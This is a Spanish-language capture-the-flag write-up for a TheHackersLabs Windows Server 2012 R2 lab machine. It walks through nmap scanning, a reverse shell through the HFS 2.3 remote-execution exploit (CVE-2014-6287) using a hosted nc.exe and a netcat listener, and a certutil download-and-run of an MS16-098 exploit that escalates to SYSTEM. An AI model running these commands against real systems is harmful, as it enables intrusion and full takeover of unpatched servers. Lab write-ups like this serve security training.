# Writeup — Espeto Malagueño (TheHackersLabs)

**Plataforma:** TheHackersLabs  
**Sistema:** Windows Server 2012 R2 Standard x64  
**IP:** 10.10.10.80  
**Objetivo:** Obtener user.txt y root.txt

---

## 1. Reconocimiento

Descubrimos el host vivo con `netdiscover`:

```bash
sudo netdiscover -i eth0 -r 10.10.10.0/24
```

```
10.10.10.80   08:00:27:54:29:19   PCS Systemtechnik GmbH (VirtualBox)
```

Escaneo de puertos:

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.10.80 -oG all_ports.txt
```

Puertos abiertos: `80, 135, 139, 445, 5985, 47001, 49152-49157`

Escaneo de servicios:

```bash
nmap -p80,135,139,445,5985,47001,49152-49157 -sCV -vvv 10.10.10.80
```

**Resultados clave:**
- Puerto **80** → `HttpFileServer (HFS) 2.3`
- Puerto **445** → SMB con `message signing disabled`
- SO: **Windows Server 2012 R2**

---

## 2. Explotación — HFS 2.3 RCE (CVE-2014-6287)

Identificamos el exploit:

```bash
searchsploit HttpFileServer 2.3
```

```
Rejetto HttpFileServer 2.3.x - Remote Command Execution (3) | windows/webapps/49125.py
```

```bash
searchsploit -m windows/webapps/49125.py
chmod +x 49125.py
```

Preparamos `nc.exe` en nuestro servidor HTTP:

```bash
cp /usr/share/seclists/Web-Shells/FuzzDB/nc.exe .
python3 -m http.server 80
```

Abrimos listener en otra terminal:

```bash
nc -lvnp 4444
```

Ejecutamos el exploit (modificando IP y puerto local dentro del script):

```bash
python2 49125.py 10.10.10.80 80
```

Recibimos shell como usuario `hacker`:

```
connect to [10.10.10.5] from (UNKNOWN) [10.10.10.80] 49188
Microsoft Windows [Versión 6.3.9600]
C:\Users\hacker\Downloads>whoami
win-re8njpg9k5n\hacker
```

Capturamos `user.txt`:

```bash
C:\Users\hacker\Downloads>type user.txt
<REDACTED>
```

---

## 3. Post-Explotación — Escalada de Privilegios

Obtenemos información del sistema:

```bash
C:\Users\hacker\Downloads>systeminfo
```

Sistema: **Windows Server 2012 R2 build 9600** con pocos parches.

Usamos `Windows-Exploit-Suggester` para identificar vulnerabilidades:

```bash
wget https://raw.githubusercontent.com/strozfriedberg/Windows-Exploit-Suggester/master/windows-exploit-suggester.py
python2 windows-exploit-suggester.py --database 2026-06-08-mssb.xls --systeminfo sysinfo
```

Identificamos **MS16-098** como candidato.

Descargamos el exploit `MS16-098.exe` y lo transferimos a la víctima:

```bash
# En Kali:
python3 -m http.server 80

# En la shell Windows:
certutil -urlcache -f http://10.10.10.5/MS16-098.exe MS16-098.exe
MS16-098.exe
```

Obtenemos shell como `NT AUTHORITY\SYSTEM`:

```
whoami
nt authority\system
```

Capturamos `root.txt`:

```bash
type C:\Users\Administrator\Desktop\root.txt
<REDACTED>
```

---

## 4. Flags

| Flag | Valor |
|------|-------|
| **user.txt** | `<REDACTED>` |
| **root.txt** | `<REDACTED>` |

---

## 5. Resumen

1. **Reconocimiento** con netdiscover y nmap → HFS 2.3 en puerto 80.
2. **Acceso inicial** mediante CVE-2014-6287 (RCE en Rejetto HFS 2.3).
3. **Escalada a SYSTEM** con MS16-098 (kernel privilege escalation en Windows Server 2012 R2).
4. **Captura de flags** (user.txt y root.txt).

